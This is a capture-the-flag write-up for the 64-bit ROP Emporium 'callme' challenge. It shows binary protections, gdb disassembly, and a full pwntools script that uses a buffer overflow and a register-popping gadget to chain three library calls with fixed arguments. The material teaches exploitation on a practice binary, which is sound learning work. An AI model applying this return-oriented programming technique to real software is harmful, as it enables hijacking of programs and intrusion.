## 64 bits

```bash
$ checksec callme
[*] '/home/localuser/ropemporium/callme/64bits/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

Now I'll open it on gdb to analyse it:

```
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
```

Like before `main` calls `pwnme` that is vulnerable to a buffer overflow, now we have two new functions: `usefulFunction` and `usefulGadgets`:

```bash
pwndbg> disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:     push   rbp
   0x00000000004008f3 <+1>:     mov    rbp,rsp
   0x00000000004008f6 <+4>:     mov    edx,0x6
   0x00000000004008fb <+9>:     mov    esi,0x5
   0x0000000000400900 <+14>:    mov    edi,0x4
   0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:    mov    edx,0x6
   0x000000000040090f <+29>:    mov    esi,0x5
   0x0000000000400914 <+34>:    mov    edi,0x4
   0x0000000000400919 <+39>:    call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:    mov    edx,0x6
   0x0000000000400923 <+49>:    mov    esi,0x5
   0x0000000000400928 <+54>:    mov    edi,0x4
   0x000000000040092d <+59>:    call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:    mov    edi,0x1
   0x0000000000400937 <+69>:    call   0x400750 <exit@plt>
End of assembler dump.
pwndbg> disassemble usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:     pop    rdi
   0x000000000040093d <+1>:     pop    rsi
   0x000000000040093e <+2>:     pop    rdx
   0x000000000040093f <+3>:     ret    
End of assembler dump.
```

So `usefulFunction` calls `callme_three`, `callme_two` and `callme_one`, and `UsefelGadgets` pops some registers. To see what are these callme functions we'll have to see them on the `libcallme.so` binary, these callme functions takes three arguments:

```bash
0x0000000000000822 <+8>:     mov    QWORD PTR [rbp-0x18],rdi      
   0x0000000000000826 <+12>:    mov    QWORD PTR [rbp-0x20],rsi
   0x000000000000082a <+16>:    mov    QWORD PTR [rbp-0x28],rdx
   0x000000000000082e <+20>:    movabs rax,0xdeadbeefdeadbeef        
   0x0000000000000838 <+30>:    cmp    QWORD PTR [rbp-0x18],rax                                                                                                                        
   0x000000000000083c <+34>:    jne    0x912 <callme_one+248> 
   0x0000000000000842 <+40>:    movabs rax,0xcafebabecafebabe
   0x000000000000084c <+50>:    cmp    QWORD PTR [rbp-0x20],rax                            
   0x0000000000000850 <+54>:    jne    0x912 <callme_one+248>                              
   0x0000000000000856 <+60>:    movabs rax,0xd00df00dd00df00d 
```

Now with the `usefulGadgets` address that pops the values of `rdi`,`rsi` and `rdx` we can pop values and change it with the values of the `callme_` functions

```python
from pwn import *

p = process("./callme")
elf = ELF("./callme")

# gadgets:

pop_rdi_rsi_rsx = p64(0x40093c)

arg1 = p64(0xdeadbeefdeadbeef) 
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)

payload = b"a"*40
payload += pop_rdi_rsi_rsx
payload += arg1
payload += arg2
payload += arg3
payload += callme_one
payload += pop_rdi_rsi_rsx
payload += arg1
payload += arg2
payload += arg3
payload += callme_two
payload += pop_rdi_rsi_rsx
payload += arg1
payload += arg2
payload += arg3
payload += callme_three
payload += pop_rdi_rsi_rsx
payload += arg1
payload += arg2
payload += arg3

p.recvuntil(">")
p.sendline(payload)
p.recvline()
p.interactive()
```


